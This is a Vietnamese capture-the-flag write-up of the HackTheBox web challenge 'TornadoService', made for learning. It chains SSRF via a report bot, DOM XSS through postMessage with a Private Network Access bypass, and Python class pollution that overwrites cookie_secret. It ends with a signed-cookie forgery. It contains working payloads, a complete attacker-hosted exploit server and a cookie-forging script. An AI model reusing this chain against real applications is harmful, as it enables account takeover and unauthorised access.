---
title: "TorandoService"
date: 2026-04-23
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
tags: ["web", "hackthebox"]
draft: false
---

# TornadoService
## Challenge Information
- **Category**: Web Exploitation
- **Event**: none
- **Author**: leanthedev
- **Difficulty**: Medium
- **URL**: https://app.hackthebox.com/challenges/TornadoService
- **Tags**: #web #XSS 
---
## 1. Description
>You have found a portal of the recently arising tornado malware, it appears to have some protections implemented but a bet was made between your peers that they are not enough. Will you win this bet?
## 2. Overview

## 3. Source Code Analysis
Vì là một web challenge nên mình sẽ trải nghiệm các chức năng của web trước:

![](./images/Pasted%20image%2020260417225816.png)

Nhìn vào giao diện phần nào mình cũng đoán được đây là một web quản lý dịch vụ cho thuê host cloud (hoặc có thể không :v), với các chức năng như upload trạng thái machine, report IP

Vì là một bài whitebox nên thay vì đoán mò mình sẽ tìm hiểu sâu hơn các chức năng trong source code luôn, source map như sau:

![](./images/Pasted%20image%2020260417225518.png)

Tổng quan ứng dụng được viết bằng Torando Framework, với các chức năng cơ bản để quản lý các machine. Sau khi duyệt qua source thì mình tìm thấy flag được hiển thị ngay trong `/stats` -> `ProtectedContentHandler`: 

![](./images/Pasted%20image%2020260418134656.png)

Mình cũng đã tìm thấy một vài tài khoản challenge cung cấp nhưng thực tế thì khó mà vào được vì password đã là một chuỗi random:

![](./images/Pasted%20image%2020260418134734.png)

Để hiểu được flow của web và tìm hướng đi mới thì mình tiếp tục xem xét chức năng của từng route mà server khởi tạo:

![](./images/Pasted%20image%2020260417232559.png)

- `/get_tornados`: Lấy thông tin các machine dưới dạng json, sau đó sẽ được trình duyệt render và hiển thị.

	![](./images/Pasted%20image%2020260418001925.png)

	![](./images/Pasted%20image%2020260418002051.png)

- `/update_tornado`:

	![](./images/Pasted%20image%2020260418124336.png)

Và nhìn hàm `update_tornados()`, mình nghĩ nếu cho hàm này chạy rơi vào nhánh nhỏ `else: update[index] = value` thì sẽ có cơ hội thêm được giá trị tùy ý vào thuộc tính (ghi đè) --> **Class Pollution**. Nếu như biến ghi đè là một cookie thì ta có thể truy cập mà không cần password (hoặc không).

Nhưng trước khi chạy hàm ta cần `machine_id` --> lấy ở ngay giao diện của web.

Thì để bypass được một hàm đệ quy phức tạp như thế mình có payload cho `tornado` như sau:

```json
{
  "__class__": {
    "__init__": {
      "__globals__": {
        "APP": {
          "settings": {
            "cookie_secret": "haha"
          }
        }
      }
    }
  }
}
```

*(Phần giải thích payload có thể tham khảo thêm)*
Cách payload này hoạt động: ban đầu `updated` đang là một `TornadoObject`

**Lớp 1: `__class__`**

- **Dữ liệu xét:** `index` là `"__class__"`, `value` là `{"__init__": ...}`.
    
- Nó rơi vào Nhánh 2 (vì object `TornadoObject` không phải dict), sau đó thỏa mãn nhánh này luôn vì thuộc tính `__class__` luôn có trong mọi class của python và value đang là dict. Sau đó dùng `getattr()` để lấy class ra.
    
- **Đệ quy lần 1:** Gọi `update_tornados(value, TornadoObject)`.
    
**Lớp 2: `__init__`**

- **Dữ liệu xét:** `index` là `"__init__"`, `value` là `{"__globals__": ...}`.
    
- Nó tiếp tục rơi vào Nhánh 2. Sau đó dùng `getattr()` để lấy hàm `__init__` ra.
    
- **Đệ quy lần 2:** Gọi `update_tornados({"__globals__": ...}, TornadoObject.__init__)`.
    
**Lớp 3: `__globals__`**

- **Dữ liệu xét:** `index` là `"__globals__"`, `value` là `{"APP": ...}`.
    
- `TornadoObject.__init__` là hàm và trong Python mọi hàm đều có một thuộc tính ẩn là `__globals__` -> Tiếp tục vào Nhánh 2 và true. và vì `__globals__` chứa toàn bộ các biến toàn cục của file code đó dưới dạng một Dictionary nên lúc này `getattr()` sẽ gọi ra một `<Dictionary_Globals>`.
    
- **Đệ quy lần 3:** Gọi `update_tornados({"APP": ...}, <Dictionary_Globals>)`.
    
**Lớp 4: APP**

- **Dữ liệu xét:** `index` là `"APP"`, `value` là `{"settings": ...}`.
    
- Lúc này `updated` đang là một Dictionary. Lần đầu tiên, nó nhảy vào **Nhánh 1**. Sau đó nó tìm xem có biến `"APP"` trong không gian toàn cục không? Có -> Gọi tiếp đệ quy để đi sâu vào đối tượng `APP`.
    
- **Đệ quy lần 4:** Gọi `update_tornados({"settings": ...}, APP)`.
    
**Lớp 5: `settings`**

- **Dữ liệu xét:** `index` là `"settings"`, `value` là `{"cookie_secret": "haha"}`.
    
- `APP` là object (`APP = make_app()`), không phải dict. Tiếp tục vào **Nhánh 2**. `APP` có thuộc tính `settings` -> Tiếp tục đệ quy vào trong `APP.settings` (dictionary).
    
- **Đệ quy lần 5:** Gọi `update_tornados({"cookie_secret": "haha"}, APP.settings)`.
    
**Lớp 6: `cookie_secret`**

- **Dữ liệu xét:** `index` là `"cookie_secret"`, `value` là chuỗi `"haha"`.
    
- Lúc này `updated` là dictionary `APP.settings` (Nhảy vào **Nhánh 1**). Tuy nhiên, lần này `value` là chuỗi `"haha"` (`type(value) == dict` là False) -> Nó đi thẳng vào nhánh `else` của Nhánh 1:
	```python
	updated[index] = value
	```

	Tương đương với: `APP.settings["cookie_secret"] = "haha"`

--> Vậy là ta đã ghi đè cookie thành công.

- `/report_tornado` -> `ReportTornadoHandler`: Tính năng để use report một máy Tornado bị lỗi hoặc cần kiểm tra. Nhưng nó lại mắc sai lầm:

	![](./images/Pasted%20image%2020260418133855.png)

	- Hàm `is_valid_url()` cũng chẳng filter gì:

	![](./images/Pasted%20image%2020260418134100.png)

	- Bot sẽ giả lập để truy cập vào trình duyệt:

	![](./images/Pasted%20image%2020260418134023.png)

--> Ta dễ dàng nhận ra nếu ta điều khiển bot truy cập vào các trang nội bộ thì sẽ bypass được `/update_tornado` vốn yêu cầu localhost -> **SSRF**

Những chức năng khác như `/login`, `/`,... thì cũng không có gì để khai thác nên mình sẽ không nói dài dòng.

Dựa vào các tính năng trên của web mình có thể xâu chuỗi thành một exploit chain như sau:

Host server chứa payload độc --> Report cho bot đến và kiểm tra dính XSS --> Payload sẽ ép bot `POST /update_tornado` từ IP `127.0.0.1` (bypass được only localhost) --> Class Pollution sẽ trigger và ghi đè biến `cookie_secret` để ta truy cập.

Mình sẽ kiểm tra xem các giả thuyết trên có đúng không và bot có thể truy cập ra các đường dẫn internet bên ngoài không:

- Gửi request `GET /report_tornado?ip=webhook.site/052b3260-fd0b-4038-991a-ebdd1debbeae` bằng burp (lưu ý không có http://):

![](./images/Pasted%20image%2020260418142303.png)

- Check webhook:

![](./images/Pasted%20image%2020260418142344.png)

--> Thành công.

Lúc này mình đã nghĩ là ăn chắc rồi nhưng khi bắt tay vào thực hiện thì mọi thứ mới khó khăn hơn mình nghĩ =))) Cụ thể rào cản **Private Network Access (PNA)** của trình duyệt đã cấm hoàn toàn các trang web bên ngoài tự ý gửi request đến local network của máy chủ, từ đây mọi nỗ lực dùng `fetch()` hay `XMLHttpRequest` đều vô ích. Có thể tìm hiểu thêm ở [ĐÂY](https://wicg.github.io/private-network-access/)

Lúc này thì mình tiếp tục xem lại source và mình xem cả phần javascript của giao diện, có thể dễ dàng nhận ra **DOM XSS** mà ta đã bỏ lỡ ở phần trước, trong file `tornado-service.js`:

![](./images/Pasted%20image%2020260419011630.png)

Mặc dù tác giả che mặt rất kỹ và khó khăn lắm mình mới nhận ra =))

![](./images/Pasted%20image%2020260419011832.png)

DOM-XSS đã cứu mình trong những lúc khó khăn như thế này. Cụ thể, bằng cách gửi payload XSS qua `postMessage`, script sẽ được thực thi ngay trong chính trang web (hay còn gọi là same-origin). Một khi mã JS đã đứng bên trong thì nó có thể tự do gửi request đến `/update_tornado` mà không bị PNA hay Same-Origin Policy chặn lại nữa. 

Và gần như mọi thứ đã oke, giờ viết payload và exploit là xong.
## 4. Exploitation

Ta có thể bypass PNA bằng `let targetWindow = window.open("http://localhost:1337/");`.

- Mở thẻ `<Iframe>` bị coi là tải tài nguyên chéo nên bị chặn.

- Dùng `window.open()` để mở hẳn một tab mới luôn thì lại được phép. Tab mới này sẽ chạy độc lập và được Chrome công nhận là thuộc về `localhost`.

- Lúc này, ta chỉ cần gọi `targetWindow.postMessage()` để bắn payload vào tab vừa mở -> XSS được kích hoạt.

**Sự thất bại của Ngrok/Localtunnel (Layer 7 - HTTP/HTTPS), trích gemini:**

Khi chạy `ngrok http 80` để public máy chủ Python, Ngrok tạo ra một đường hầm HTTP (Layer 7 của mô hình OSI). Vì các dịch vụ miễn phí thường bị lợi dụng để lừa đảo (phishing), Ngrok và Pinggy sẽ can thiệp vào tầng HTTP này: Khi có request mới truy cập, thay vì trả về file HTML của bạn, máy chủ Ngrok sẽ trả về một **màn hình HTML cảnh báo (Interstitial Screen)** yêu cầu người dùng bấm nút "Visit Site".

![](./images/Pasted%20image%2020260419013408.png)

Con Bot là trình duyệt Headless chạy ngầm, nó không có khả năng click nút này. Luồng thực thi bị chặn đứng hoàn toàn trước khi chạm tới mã XSS (Hay nói cho nhanh là vì hàng free nên chỉ đến thế :vv).

Lúc này mình được một người anh (anh Trung) gợi ý đến `segfault`, một dịch vụ host miễn phí nhưng sẽ giúp giải quyết được vấn đề trên. Xem kỹ hơn ở [ĐÂY](https://www.thc.org/segfault/)

![](./images/Pasted%20image%2020260419013606.png)

cmd: `ssh root@segfault.net` -> password: `segfault`
Sau đó đợi 30s và nhấn giữ phím bất kỳ trong 10s là xong

dùng `curl sf/port` để lấy cổng public:

![](./images/Pasted%20image%2020260419014034.png)

`nano server.py` để chỉnh sửa file server như sau:

```js
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

PORT = 12345 

EXPLOIT_JS = """
fetch('/get_tornados')
.then(r => r.json())
.then(data => {
    fetch('/update_tornado', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            "machine_id": data[0].machine_id,
            "__class__": {
                "__init__": {
                    "__globals__": {
                        "APP": {
                            "settings": {
                                "cookie_secret": "pwn"
                            }
                        }
                    }
                }
            }
        })
    })
});
"""

encoded_js = base64.b64encode(EXPLOIT_JS.encode()).decode()

HTML_PAYLOAD = f"""
<!DOCTYPE html>
<html>
<body>
    <h1>Exploit Running...</h1>
    <script>
        const xssPayload = `<img src=x onerror="eval(atob('{encoded_js}'))">`;
        
        // Mở tab mới lách Private Network Access
        let targetWindow = window.open("http://localhost:1337/");
        
        setTimeout(() => {{
            targetWindow.postMessage({{
                machine_id: xssPayload,
                ip_address: "1",
                status: "1"
            }}, "*");
        }}, 1000);
    </script>
</body>
</html>
"""

class MaliciousServer(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\\n[+] Bot truy cập: {self.path}")
        if self.path == '/agent_details':
            payload_bytes = HTML_PAYLOAD.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Connection', 'close')
            self.send_header('Content-Length', str(len(payload_bytes)))
            self.end_headers()
            self.wfile.write(payload_bytes)
            print("[+] Đã gửi Payload thành công!")
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    print(f"[*] Server đang nghe tại cổng {PORT}")
    server = HTTPServer(('0.0.0.0', PORT), MaliciousServer)
    server.serve_forever()
```

`python3 server.py` để chạy:

![](./images/Pasted%20image%2020260419014143.png)

Sử dụng Burp để gửi request đến `/report_tornado?ip={ip server}`:

![](./images/Pasted%20image%2020260418221651.png)

Tất nhiên bây giờ ta đã ghi đè cookie_secret thành nội dung mà ta mong muốn, lấy nội dung đó paste vào script dưới đây để tạo ra cookie theo chuẩn tornado:

```python
import tornado.web  
  
# 1. ghi đè thành công qua Class Pollution  
hacked_secret = "{chuỗi bất kỳ mà ta đã biết}"  
  
# 2. Tên đăng nhập hợp lệ
target_username = "lean@tornado-service.htb"  
  
# 3. Sử dụng chính hàm của Tornado để ký cookie  
forged_cookie_bytes = tornado.web.create_signed_value(  
    hacked_secret,  
    "user",  
    target_username  
)  

forged_cookie = forged_cookie_bytes.decode('utf-8')  
print("\n[+] TẠO COOKIE THÀNH CÔNG!")  
print("-" * 50)  
print(f"Cookie: user={forged_cookie}")  
print("-" * 50)
```

![](./images/Pasted%20image%2020260418221730.png)

Sau đó GET với cái Cookie vừa tạo qua `/stats` để lấy FLAG:

![](./images/Pasted%20image%2020260418221742.png)

>h@ppy h@ck!n9 
>*(BKSEC)*
